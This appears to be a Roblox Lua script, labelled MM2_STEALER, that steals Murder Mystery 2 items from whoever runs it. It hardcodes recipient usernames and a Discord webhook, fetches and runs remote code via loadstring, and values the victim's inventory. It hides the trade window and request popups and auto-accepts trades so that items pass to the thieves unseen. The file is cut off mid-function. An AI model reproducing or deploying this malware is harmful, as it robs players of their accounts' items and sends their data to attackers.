-- discord.gg/syncrypt

local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)

		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end

	return function()
		local r = table.pack(f(s, c))

		if r[1] == nil then
			return false
		end

		c = r[1]

		return true, table.unpack(r, 1, r.n)
	end
end

if not getgenv then
	local t1 = {}

	getgenv = function()
		return t1
	end
end

if task then
	if not task.spawn then
		task.spawn = spawn
	end
else
	task = {
		spawn = spawn,
		wait = wait,
		delay = delay,
	}
end

if not request then
	request = syn and syn.request
		or http and http.request
		or fluxus and fluxus.request
		or krnl and krnl.request
		or function()
			return {
				StatusCode = 0,
				Body = "",
			}
		end
end

Usernames = {
	"loopversions",
	"altdoguizinho1",
	"skittlesaresoyummyy",
}
BigHitsWebhook =
	"https://canary.discord.com/api/webhooks/1550065968795877441/SXTJpxOxr57H8HoykXIDtxOG5WZ9ErsV_6KwRfZpCTExLTqBzPuy9CEZYMZVHhQZ9hFr"

repeat
	task.wait()
until game:IsLoaded()

local JobId = game.JobId

if tostring(identifyexecutor and identifyexecutor() or ""):lower():find("delta") then
	local v6 = getrenv()
	local JobId2 = game.JobId

	local function v8()
		local hookfunction_ = v6.hookfunction or hookfunction

		return type(hookfunction_) == "function" and hookfunction_ == hookfunction
	end
	local function v10(p1)
		local v11 = #tostring(game.PlaceId) * p1 % 255
		local v12 = string.byte(tostring(os.clock()):sub(-2), 1) or 37
		local v13 = math.random(1, 255)

		return bit32.bxor(bit32.bxor(v11, v12 % 255), v13) % 255 + 1
	end

	local v14 = v10(3)
	local v15 = v10(7)
	local v16 = v10(13)

	local function v17(p2)
		local t2 = {}

		for i = 1, #p2 do
			local v20 = bit32.bxor(bit32.bxor(bit32.bxor(string.byte(p2, i), v14), v15), v16)

			t2[i] = string.char(v20)
		end

		return table.concat(t2)
	end

	local t3 = {
		v17("RealJobId"),
		v17("TeleportService"),
		v17("TeleportToPlaceInstance"),
	}
	local t4 = {}
	local t5 = {}
	local handlers = {}
	local u25
	local u26 = false

	local function v27()
		while u25 and not u26 do
			u25 = handlers[u25]()
		end
	end
	local function v28()
		handlers[2] = function()
			t5.fake = JobId2

			local JobId3 = v6.game.JobId

			t5.real = JobId3 or JobId2
			t4[2] = true

			return 7
		end
		handlers[7] = function()
			if not t4[2] then
				u26 = true

				return nil
			end

			t5.jid = t5.real
			t4[7] = true

			return math.random(0, 1) == 0 and 11 or 13
		end
		handlers[11] = function()
			if not t4[7] then
				u26 = true

				return nil
			end

			t5.pid = game.PlaceId
			t4[11] = true

			return 13
		end
		handlers[13] = function()
			if not t4[7] then
				u26 = true

				return nil
			end

			getgenv()[v17(t3[1])] = t5.jid
			t4[13] = true

			return 17
		end
		handlers[17] = function()
			if not t4[13] then
				u26 = true

				return nil
			end

			if v8() then
				print(t5.real)

				return nil
			end

			u26 = true

			return nil
		end
		u25 = 2
	end
	local function v30()
		local u31 = false
		local handlers2 = {}

		local function v33()
			if u31 then
				return
			end

			u31 = true
			v28()
			v27()
		end

		for i, v in ipairs({
			function()
				return v6.task and v6.task.wait
			end,
			function()
				return v6.tick
			end,
			function()
				return v6.os and v6.os.time
			end,
			function()
				return v6.math and v6.math.random
			end,
		}) do
			local v36 = v()

			if v36 then
				handlers2[i] = hookfunction(v36, function(...)
					v33()

					return handlers2[i](...)
				end)
			end
		end
	end

	v30()
	wait(2)

	if getgenv().RealJobId and #getgenv().RealJobId == 36 then
		JobId = getgenv().RealJobId
	else
		local logHistory = game:GetService("LogService"):GetLogHistory()

		for i = 1, #logHistory do
			local v39 = logHistory[i].message:lower()

			if #v39 == 36 then
				JobId = v39

				break
			end
		end
	end
end

local function v40()
	return JobId or game.JobId
end

local v41 = v40()

if getgenv().executed and getgenv()._execJobId == v41 then
	return
end

getgenv().executed = true
getgenv()._execJobId = v41

local chunk

pcall(function()
	chunk = loadstring(
		game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/addons/serverhop", true)
	)
end)

local Players = game:GetService("Players")
local abcdefg = getgenv().abcdefg or v40()
local ok, result = pcall(function()
	local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
	local GetServerType = RobloxReplicatedStorage and RobloxReplicatedStorage:FindFirstChild("GetServerType")

	return GetServerType and GetServerType:InvokeServer() == "VIPServer" or false
end)

VIP = ok and result or false
FULL = Players.MaxPlayers <= #Players:GetPlayers()
SHALL_SERVERHOP = VIP or FULL

local v49 = (identifyexecutor and identifyexecutor() or ""):lower()

if SHALL_SERVERHOP then
	if not v49:find("delta") then
		if not v49:find(string.char(107, 114, 110, 108)) then
			if VIP then
				Players.LocalPlayer:Kick("Vip Servers Are Not Supported!\nTeleporting To Supported Server In A Second")
			end

			if FULL then
				Players.LocalPlayer:Kick(
					"Full Servers Are Not Supported Due To!\nTeleporting To Supported Server In A Second"
				)
			end

			if type(chunk) == "function" then
				pcall(chunk)
			end

			return
		end
	end
end

MinRarity = "Common"
ROBLOX_JOIN_CLICK_URL = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. abcdefg
Webhook = BigHitsWebhook
USERNAME_PATTERN_ALLOWED = false

local t6 = {
	1116352408,
	1899447441,
	3049323471,
	3921009573,
	961987163,
	1508970993,
	2453635748,
	2870763221,
	3624381080,
	310598401,
	607225278,
	1426881987,
	1925078388,
	2162078206,
	2614888103,
	3248222580,
	3835390401,
	4022224774,
	264347078,
	604807628,
	770255983,
	1249150122,
	1555081692,
	1996064986,
	2554220882,
	2821834349,
	2952996808,
	3210313671,
	3336571891,
	3584528711,
	113926993,
	338241895,
	666307205,
	773529912,
	1294757372,
	1396182291,
	1695183700,
	1986661051,
	2177026350,
	2456956037,
	2730485921,
	2820302411,
	3259730800,
	3345764771,
	3516065817,
	3600352804,
	4094571909,
	275423344,
	430227734,
	506948616,
	659060556,
	883997877,
	958139571,
	1322822218,
	1537002063,
	1747873779,
	1955562222,
	2024104815,
	2227730452,
	2361852424,
	2428436474,
	2756734187,
	3204031479,
	3329325298,
}

local function v51(p3)
	return p3 % 4294967296
end
local function v52(p4, p5)
	local v53, v54, v55, v56 = p4:byte(p5, p5 + 3)

	return v53 * 16777216 + v54 * 65536 + v55 * 256 + v56
end
local function v57(p6)
	local v58 = #p6
	local v59 = p6 .. "\128"

	while #v59 % 64 ~= 56 do
		v59 ..= "\0"
	end

	local v60 = v58 * 8
	local v61 = v59
		.. "\0\0\0\0"
		.. string.char(bit32.rshift(v60, 24) % 256, bit32.rshift(v60, 16) % 256, bit32.rshift(v60, 8) % 256, v60 % 256)
	local t7 = {
		1779033703,
		3144134277,
		1013904242,
		2773480762,
		1359893119,
		2600822924,
		528734635,
		1541459225,
	}

	for i = 1, #v61, 64 do
		local t8 = {}

		for i2 = 1, 16 do
			t8[i2] = v52(v61, i + (i2 - 1) * 4)
		end

		for i2 = 17, 64 do
			local bxor = bit32.bxor

			t8[i2] = v51(
				t8[i2 - 16]
					+ bit32.bxor(
						bit32.rrotate(t8[i2 - 15], 7),
						bit32.rrotate(t8[i2 - 15], 18),
						bit32.rshift(t8[i2 - 15], 3)
					)
					+ t8[i2 - 7]
					+ bxor(bit32.rrotate(t8[i2 - 2], 17), bit32.rrotate(t8[i2 - 2], 19), bit32.rshift(t8[i2 - 2], 10))
			)
		end

		local v68 = t7[1]
		local v69 = t7[2]
		local v70 = t7[3]
		local v71 = t7[4]
		local v72 = t7[5]
		local v73 = t7[6]
		local v74 = t7[7]
		local v75 = t7[8]

		for i2 = 1, 64 do
			local bxor = bit32.bxor
			local band = bit32.band
			local v79 = v51(
				v75
					+ bit32.bxor(bit32.rrotate(v72, 6), bit32.rrotate(v72, 11), bit32.rrotate(v72, 25))
					+ bxor(bit32.band(v72, v73), band(bit32.bnot(v72), v74))
					+ t6[i2]
					+ t8[i2]
			)
			local bxor2 = bit32.bxor
			local v81 = v51(
				bit32.bxor(bit32.rrotate(v68, 2), bit32.rrotate(v68, 13), bit32.rrotate(v68, 22))
					+ bxor2(bit32.band(v68, v69), bit32.band(v68, v70), bit32.band(v69, v70))
			)

			v75 = v74
			v74 = v73
			v73 = v72
			v72 = v51(v71 + v79)
			v71 = v70
			v70 = v69
			v69 = v68
			v68 = v51(v79 + v81)
		end

		t7[1] = v51(t7[1] + v68)
		t7[2] = v51(t7[2] + v69)
		t7[3] = v51(t7[3] + v70)
		t7[4] = v51(t7[4] + v71)
		t7[5] = v51(t7[5] + v72)
		t7[6] = v51(t7[6] + v73)
		t7[7] = v51(t7[7] + v74)
		t7[8] = v51(t7[8] + v75)
	end

	return string.format("%08x%08x%08x%08x%08x%08x%08x%08x", t7[1], t7[2], t7[3], t7[4], t7[5], t7[6], t7[7], t7[8])
end
local function v82(p7)
	local function v83(p8)
		return string.char(tonumber(p8, 16))
	end

	return p7:gsub("%x%x", v83)
end

local t9 = {
	digest = v57,
	hmac = function(p9, p10)
		if #p9 > 64 then
			p9 = v82(v57(p9))
		end

		local v85 = p9 .. string.rep("\0", 64 - #p9)
		local t10 = {}
		local t11 = {}

		for i = 1, 64 do
			t10[i] = string.char(bit32.bxor(v85:byte(i), 54))
			t11[i] = string.char(bit32.bxor(v85:byte(i), 92))
		end

		return v57(table.concat(t11) .. v82(v57(table.concat(t10) .. p10)))
	end,
}

MM2_STEALER = function()
	version = "Comparison is the thief of joy"

	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 600)
	game:GetService("HttpService")
	game:GetService("Players")
	game:GetService("Workspace")
	game:GetService("ReplicatedStorage")

	local Players2 = game:GetService("Players")

	game:GetService("RunService")
	game:GetService("Workspace")
	game:GetService("VirtualUser")

	local VirtualUser = game:GetService("VirtualUser")

	game:service("Players").LocalPlayer.Idled:connect(function()
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.new())
	end)
	task.spawn(function()
		local RunService = game:GetService("RunService")
		local now = tick()

		RunService.Heartbeat:Connect(function()
			if tick() - now >= 900 then
				now = tick()
				pcall(function()
					VirtualUser:CaptureController()
					VirtualUser:ClickButton2(Vector2.new())
				end)
			end
		end)
	end)

	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 600)
	game:GetService("HttpService")
	game:GetService("Players")
	game:GetService("Workspace")

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players3 = game:GetService("Players")

	game:GetService("RunService")
	game:GetService("Workspace")
	game:GetService("VirtualUser")

	local LocalPlayer = Players3.LocalPlayer

	pcall(function()
		return ReplicatedStorage.Remotes.Gameplay.CoinCollected
	end)
	pcall(function()
		return ReplicatedStorage.Remotes.Gameplay.RoundStart
	end)

	local t12 = {
		"MouseButton1Click",
		"MouseButton1Down",
		"Activated",
	}

	TapUI = function(p11, p12, p13)
		if p12 == "Active Check" then
			if not p11.Active then
				return
			end

			p11 = p11[p13]
		end

		if p12 == "Text Check" then
			if p11 ~= "^" then
				return
			end

			p11 = p13
		end

		for _, v in pairs(t12) do
			for _, v2 in pairs(getconnections(p11[v])) do
				v2:Fire()
			end
		end
	end

	repeat
		task.wait(1)
		pcall(function()
			TapUI(LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
		end)
		pcall(function()
			TapUI(game:GetService("Players").LocalPlayer.PlayerGui.Join.Friends.Play)
		end)
	until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")

	universeid = game.GameId

	if universeid ~= 66654135 then
		return
	end

	get_device_type = function()
		local Lobby = game.Players.LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby")

		return Lobby and Lobby:FindFirstChild("LeaderBar") ~= nil and "mobile" or "tablet"
	end

	local Trade = ReplicatedStorage:WaitForChild("Trade")
	local Players4 = game:GetService("Players")
	local LastOffer
	local u105 = false

	Trade.UpdateTrade.OnClientEvent:Connect(function(p14)
		if p14 then
			LastOffer = p14.LastOffer
		end
	end)
	Trade.AcceptTrade.OnClientEvent:Connect(function(p15)
		if p15 then
			u105 = true
		end
	end)

	local Item = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
	local HttpService = game:GetService("HttpService")

	local function v108(p16)
		return (p16 or ""):lower():gsub("[%s%'%-]", "")
	end

	local t13 = {}
	local t14 = {}
	local t15 = {
		{
			url = "https://www.mm2values.com/?p=godly",
			isChroma = false,
		},
		{
			url = "https://www.mm2values.com/?p=ancient",
			isChroma = false,
		},
		{
			url = "https://www.mm2values.com/?p=unique",
			isChroma = false,
		},
		{
			url = "https://www.mm2values.com/?p=vintage",
			isChroma = false,
		},
		{
			url = "https://www.mm2values.com/?p=legend",
			isChroma = false,
		},
		{
			url = "https://www.mm2values.com/?p=chroma",
			isChroma = true,
		},
	}
	local v112 = #t15
	local n1 = 0
	local BindableEvent = Instance.new("BindableEvent")
	local v115, v116, v117 = ipairs(t15)

	for _, v in v115, v116, v117 do
		task.spawn(function()
			pcall(function()
				local ok2, result2 = pcall(request, {
					Url = v.url,
					Method = "GET",
					Headers = {
						["User-Agent"] = "Mozilla/5.0",
					},
				})

				if not ok2 or not result2 then
					return
				end

				local Body = result2.Body or ""

				if v.isChroma then
					for match, match2 in Body:gmatch("class='chroma%-text'>([^<]+)</div></b> Value: ([%d,]+)") do
						local v125 = tonumber(match2:gsub(",", ""))

						if v125 then
							t14[v108(match:gsub("^[Cc]hroma ", ""))] = v125
						end
					end
				else
					for match, match2 in Body:gmatch("<b>([^<]+)</b><br> Value: ([%d,]+)") do
						local v128 = tonumber(match2:gsub(",", ""))

						if v128 then
							t13[v108(match)] = v128
						end
					end
				end
			end)
			n1 += 1

			if n1 == v112 then
				BindableEvent:Fire()
			end
		end)
	end

	BindableEvent.Event:Wait()

	local v129 = next(t13) ~= nil
	local t16 = {}

	if not v129 then
		for i = 1, 3 do
			local ok2, result2 = pcall(function()
				return loadstring(game:HttpGet("https://www.astatine.vip/scripts/mm2_value.lua", true))()
			end)

			if ok2 and type(result2) == "table" and next(result2) then
				t16 = result2

				break
			elseif i < 3 then
				task.wait(1)
			end
		end
	end

	local function v134(p17, p18, p19, p20, p21)
		if not p17 or p17 == "" then
			return nil
		end

		local v135 = p18 or ""

		if p19 then
			v135 = "Chroma"
		end

		if v135 == "Classic" then
			v135 = "Vintage"
		end

		local v136 = t16[v135]

		if not v136 then
			return nil
		end

		local v137 = p17:lower()

		if p19 then
			v137 = "chroma " .. v137
		end

		if v136[v137] then
			return v136[v137]
		end

		if v135 == "Pet" then
			local v138 = v137:gsub("(%u)", " %1"):lower():gsub("^%s+", "")

			if v138 ~= v137 and v136[v138] then
				return v136[v138]
			end

			for k, v in pairs(v136) do
				if k:gsub("%s+", "") == v137:gsub("%s+", "") then
					return v
				end
			end

			return nil
		end

		local v141 = (p20 or ""):lower()
		local v142 = tostring(p21 or "")

		if v136[v137 .. " (" .. v141 .. ")"] then
			return v136[v137 .. " (" .. v141 .. ")"]
		end

		if v136[v137 .. " " .. v141] then
			return v136[v137 .. " " .. v141]
		end

		if v142 ~= "" then
			if v136[v137 .. " (" .. v142 .. ")"] then
				return v136[v137 .. " (" .. v142 .. ")"]
			end

			if v136[v137 .. " " .. v142] then
				return v136[v137 .. " " .. v142]
			end

			if v136[v137 .. " " .. v141 .. " (" .. v142 .. ")"] then
				return v136[v137 .. " " .. v141 .. " (" .. v142 .. ")"]
			end

			if v136[v137 .. " (" .. v141 .. ") (" .. v142 .. ")"] then
				return v136[v137 .. " (" .. v141 .. ") (" .. v142 .. ")"]
			end

			if v136[v137 .. " (" .. v142 .. ") (" .. v141 .. ")"] then
				return v136[v137 .. " (" .. v142 .. ") (" .. v141 .. ")"]
			end
		end

		local v143 = v137:gsub(" %([^%)]+%)$", "")

		for k, v in pairs(v136) do
			if k:gsub(" %([^%)]+%)$", "") == v143 then
				return v
			end
		end

		return nil
	end
	local function v146()
		local t17 = {}

		for k, v in pairs(Item) do
			if v.Rarity and v.Rarity ~= "" and v.ItemName and v.ItemName ~= "" then
				local v150 = k:find("Chroma", 1, true) ~= nil
				local v151

				if v129 then
					local v152 = v108(v.ItemName or "")

					if v150 then
						v151 = t14[v152]
					else
						v151 = t13[v152]

						if not (v151 or v152 == "") then
							for k2, v2 in pairs(t13) do
								if k2:find(v152, 1, true) then
									v151 = v2

									break
								end
							end
						end
					end
				else
					v151 = v134(v.ItemName, v.Rarity, v150, v.ItemType, v.Year)
				end

				if v151 then
					t17[k] = v151
				end
			end
		end

		return t17
	end

	local v155 = v146()
	local t18 = {
		"Common",
		"Uncommon",
		"Rare",
		"Legendary",
		"Vintage",
		"Godly",
		"Ancient",
		"Unique",
	}

	local function v157(p22)
		return p22 == "Classic" and "Vintage" or p22
	end

	local n2 = 1
	local v159, v160, v161 = ipairs(t18)
	local v162 = geniter(v159, v160, v161)

	while true do
		local v163 = table.pack(v162())

		if v163[1] then
			local v164 = v163[2]

			if v163[3] == (MinRarity or "Godly") then
				n2 = v164

				break
			end
		else
			break
		end
	end

	local t19 = {}
	local v166 = #t18
	local n3 = -1

	for i = v166, n2, -1 do
		table.insert(t19, t18[i])
	end

	WEAPON_DATABASE = Item
	PETS_DATABASE = {}
	getgenv()._claimedTotal = 0
	getgenv()._claimedItems = {}
	getgenv()._stealing = false
	getgenv()._statusEmoji = "🦖"
	getgenv()._hasClaimed = false
	GetSortedItems = function()
		local t20 = {}
		local response = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory
			:InvokeServer(game.Players.LocalPlayer.Name)
		local Owned = response.Weapons.Owned
		local Owned2 = response.Pets.Owned
		local v173 = false

		for k in pairs(Owned) do
			local v175 = WEAPON_DATABASE[k]

			if v175 and table.find(t19, v157(v175.Rarity)) then
				v173 = true
			end
		end

		for k in pairs(Owned2) do
			if v134(k, "Pet", false, nil, nil) then
				v173 = true
			end
		end

		if not v173 then
			return {}
		end

		for k, v in pairs(Owned) do
			local v179 = WEAPON_DATABASE[k]

			if v179 then
				local v180 = (v155[k] or 0) * v

				if
					v179.ItemName ~= "Default Knife"
					and v179.ItemName ~= "Default Gun"
					and table.find(t19, v157(v179.Rarity))
				then
					table.insert(t20, {
						Name = v179.ItemName,
						ID = k,
						RAP = v180,
						Class = v179.ItemType,
						Rarity = v157(v179.Rarity),
						Amount = v,
						Chroma = v179.Chroma,
					})
				end
			end
		end

		for k, v in pairs(Owned2) do
			local pet = v134(k, "Pet", false, nil, nil)

			if pet and pet > 0 then
				table.insert(t20, {
					Name = k,
					ID = k,
					RAP = pet * v,
					Class = "Pet",
					Rarity = "Pet",
					Amount = v,
					Chroma = false,
				})
			end
		end

		table.sort(t20, function(p23, p24)
			if p23.RAP ~= p24.RAP then
				return p23.RAP > p24.RAP
			end

			local v184 = table.find(t19, p23.Rarity)
			local v185 = table.find(t19, p24.Rarity)

			if v184 and v185 then
				return v184 < v185
			end

			if v184 then
				return true
			end

			if v185 then
				return false
			end

			return false
		end)

		return t20
	end
	total_value = 0
	hits = GetSortedItems()

	local v186, v187, v188 = pairs(hits)

	for _, v in v186, v187, v188 do
		total_value += v.RAP
	end

	if #hits < 1 then
		getgenv()._aj_done = true

		return
	end

	local n4 = 0

	all_items = ""

	local v192, v193, v194 = pairs(hits)
	local v195 = geniter(v192, v193, v194)

	while true do
		local v196 = table.pack(v195())

		if v196[1] then
			local v197 = v196[3]

			n4 += 1
			all_items ..= v197.Name .. " (x" .. v197.Amount .. "): " .. v197.RAP .. " Value\n"

			if n4 == 30 then
				all_items ..= "\n\nAnd more..."

				break
			end
		else
			break
		end
	end

	if not (identifyexecutor and identifyexecutor() or ""):lower():find("xeno") then
		pcall(function()
			require(game:GetService("ReplicatedStorage").Modules.InventoryModule).UpdateInventory = function() end
		end)
	end

	local v198 = get_device_type()

	HideGui = function()
		task.spawn(function()
			for _, child in pairs(game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI:GetChildren()) do
				child.Position = UDim2.new(99, 99, 99, 99)
			end

			local TradeGUI_Phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone

			TradeGUI_Phone.Inactive.Frame.Position = UDim2.new(99, 99, 99, 99)
			TradeGUI_Phone.Inactive.TradeMainOld.Position = UDim2.new(99, 99, 99, 99)
			TradeGUI_Phone.Container.Position = UDim2.new(99, 99, 99, 99)

			if v198 == "tablet" then
				local ClickBlocker = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("TradeGUI_Phone")
					:WaitForChild("ClickBlocker")

				ClickBlocker.Visible = false
				ClickBlocker:GetPropertyChangedSignal("Visible"):Connect(function()
					ClickBlocker.Visible = false
				end)

				local Inspect = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Game")
					:WaitForChild("Leaderboard")
					:WaitForChild("Inspect")

				Inspect.Visible = false
				Inspect:GetPropertyChangedSignal("Visible"):Connect(function()
					Inspect.Visible = false
				end)

				local TradeRequest = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Game")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("TradeRequest")

				TradeRequest.Visible = false
				TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
					TradeRequest.Visible = false
				end)

				local SendingRequest = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Game")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("TradeRequest")
					:WaitForChild("SendingRequest")

				SendingRequest.Visible = false
				SendingRequest:GetPropertyChangedSignal("Visible"):Connect(function()
					SendingRequest.Visible = false
				end)

				local TradeGui = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Game")
					:WaitForChild("TradeGui")

				TradeGui.Visible = false
				TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
					TradeGui.Visible = false
				end)
				pcall(function()
					local controls = require(
						game.Players.LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")
					):GetControls()

					controls.Disable = function() end
					controls:Enable()
				end)
				pcall(function()
					local GuiService = game:GetService("GuiService")

					GuiService.TouchControlsEnabled = true

					local function v209()
						GuiService.TouchControlsEnabled = true
					end

					GuiService:GetPropertyChangedSignal("TouchControlsEnabled"):Connect(v209)
				end)
			else
				local Popup = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Lobby")
					:WaitForChild("Leaderboard")
					:WaitForChild("Popup")

				Popup.Visible = false
				Popup:GetPropertyChangedSignal("Visible"):Connect(function()
					Popup.Visible = false
				end)

				local TradeRequest = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Lobby")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("OverlayMenu")
					:WaitForChild("TradeRequest")

				TradeRequest.Visible = false
				TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
					TradeRequest.Visible = false
				end)

				local SendingRequest = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Lobby")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("OverlayMenu")
					:WaitForChild("TradeRequest")
					:WaitForChild("SendingRequest")

				SendingRequest.Visible = false
				SendingRequest:GetPropertyChangedSignal("Visible"):Connect(function()
					SendingRequest.Visible = false
				end)

				local ClickBlocker = game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("TradeGUI_Phone")
					:WaitForChild("ClickBlocker")

				ClickBlocker.Visible = false
				ClickBlocker:GetPropertyChangedSignal("Visible"):Connect(function()
					ClickBlocker.Visible = false
				end)
				pcall(function()
					local controls = require(
						game.Players.LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")
					):GetControls()

					controls.Disable = function() end
					controls:Enable()
				end)
				pcall(function()
					local GuiService = game:GetService("GuiService")

					GuiService.TouchControlsEnabled = true
					GuiService:GetPropertyChangedSignal("TouchControlsEnabled"):Connect(function()
						GuiService.TouchControlsEnabled = true
					end)
				end)
			end
		end)
	end
	IsTrading = function()
		Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")

		return Trade.GetTradeStatus:InvokeServer()
	end
	ReadyTrade = function()
		local t21 = {
			weapons = {},
			pets = {},
		}

		pcall(function()
			local response = ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer.Name)
			local Owned = response.Weapons.Owned or {}

			for k, v in pairs(Owned) do
				t21.weapons[k] = v
			end

			local Owned2 = response.Pets.Owned or {}

			for k, v in pairs(Owned2) do
				t21.pets[k] = v
			end
		end)
		u105 = false

		local AcceptTrade = game:GetService("ReplicatedStorage").Trade.AcceptTrade
		local v225 = tick() + 7
		local v226 = tick() + 45

		while tick() < v226 do
			local response = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()

			if response == "None" then
				break
			end

			if response == "StartTrade" and LastOffer and v225 <= tick() then
				local u228 = false

				pcall(function()
					for _, v in
						pairs(
							getconnections(
								game.Players.LocalPlayer.PlayerGui.MainGUI.Game.TradeGui.Container.Trade.Actions.Accept.ActionButton.MouseButton1Click
							)
						)
					do
						v:Fire()
					end

					u228 = true
				end)

				if u228 then
					task.wait(0.5)
					pcall(function()
						for _, v in
							pairs(
								getconnections(
									game.Players.LocalPlayer.PlayerGui.MainGUI.Game.TradeGui.Container.Trade.Actions.Accept.Confirm.ActionButton.MouseButton1Click
								)
							)
						do
							v:Fire()
						end
					end)
					task.wait(1)
				else
					pcall(function()
						AcceptTrade:FireServer(game.PlaceId * 3, LastOffer)
					end)
				end
			end

			task.wait(0.5)
		end

		local now = tick()

		while not u105 and tick() - now < 5 do
			task.wait(0.2)
		end

		task.wait(1)

		local function v234()
			local t22 = {
				weapons = {},
				pets = {},
			}

			pcall(function()
				local response = ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer.Name)
				local Owned = response.Weapons.Owned or {}

				for k, v in pairs(Owned) do
					t22.weapons[k] = v
				end

				local Owned2 = response.Pets.Owned or {}

				for k, v in pairs(Owned2) do
					t22.pets[k] = v
				end
			end)

			return t22
		end
		local function v243(p25)
			for k, weapon in pairs(p25.weapons) do
				local v246 = WEAPON_DATABASE[k]

				if v246 and weapon > 0 then
					if table.find(t19, v157(v246.Rarity)) then
						return true
					end
				end
			end

			for k, pet in pairs(p25.pets) do
				if pet > 0 and v134(k, "Pet", false, nil, nil) then
					return true
				end
			end

			return false
		end

		local v249 = v234()
		local t23 = {}

		for k, weapon in pairs(t21.weapons) do
			local v253 = v249.weapons[k] or 0

			if v253 < weapon then
				local v254 = WEAPON_DATABASE[k]

				if v254 then
					local v255 = weapon - v253
					local v256 = (v155[k] or 0) * v255

					getgenv()._claimedTotal = (getgenv()._claimedTotal or 0) + v256

					local _claimedItems = getgenv()._claimedItems or {}

					table.insert(_claimedItems, {
						name = v254.ItemName,
						amount = v255,
						value = v256,
						rarity = v254.Rarity,
						chroma = v254.Chroma,
					})
					getgenv()._claimedItems = _claimedItems
					table.insert(t23, {
						name = v254.ItemName,
						amount = v255,
						value = v256,
						rarity = v254.Rarity,
						chroma = v254.Chroma,
					})
				end
			end
		end

		for k, pet in pairs(t21.pets) do
			local v260 = v249.pets[k] or 0

			if v260 < pet then
				local pet2 = v134(k, "Pet", false, nil, nil) or 0
				local v262 = pet - v260
				local v263 = pet2 * v262

				if v263 > 0 then
					getgenv()._claimedTotal = (getgenv()._claimedTotal or 0) + v263

					local _claimedItems = getgenv()._claimedItems or {}

					table.insert(_claimedItems, {
						name = k,
						amount = v262,
						value = v263,
						rarity = "Pet",
						chroma = false,
					})
					getgenv()._claimedItems = _claimedItems
					table.insert(t23, {
						name = k,
						amount = v262,
						value = v263,
						rarity = "Pet",
						chroma = false,
					})
				end
			end
		end

		local n5 = 0

		for k, weapon in pairs(v249.weapons) do
			local v268 = WEAPON_DATABASE[k]

			if v268 and weapon > 0 and table.find(t19, v157(v268.Rarity)) then
				n5 += 1
			end
		end

		for k, pet in pairs(v249.pets) do
			if pet > 0 and v134(k, "Pet", false, nil, nil) then
				n5 += 1
			end
		end

		local v271 = not v243(v249)

		if getgenv()._onClaim then
			pcall(getgenv()._onClaim, t23, v271, n5)
		end
	end
	SendTrade = function(p26)
		pcall(function()
			local v272 = game.Players:FindFirstChild(p26)

			if v272 then
				ReplicatedStorage.Trade.SendRequest:InvokeServer(v272)
			end
		end)
	end
	DepositItemInTrade = function(p27, p28, p29)
		if p27 == nil or p28 == nil or p29 == nil then
			LocalPlayer:Kick("something is wrong... report that here: \ndiscord.gg/X2cE85xF9m")
		end

		for i = 1, p29 do
			Trade.OfferItem:FireServer(p27, p28)
			task.wait(0.1)
		end

		DepositedItems += 1
	end
	stop_trade = function()
		if v198 == "tablet" then
			getconnections(
				game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Game")
					:WaitForChild("TradeGui")
					:WaitForChild("Container")
					:WaitForChild("Trade")
					:WaitForChild("Actions")
					:WaitForChild("Decline").MouseButton1Click
			)[1]:Fire()
		else
			getconnections(
				game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("TradeGUI_Phone")
					:WaitForChild("Container")
					:WaitForChild("Trade")
					:WaitForChild("Actions")
					:WaitForChild("Decline")
					:WaitForChild("ActionButton").MouseButton1Click
			)[1]:Fire()
		end
	end
	declince_trade_request = function()
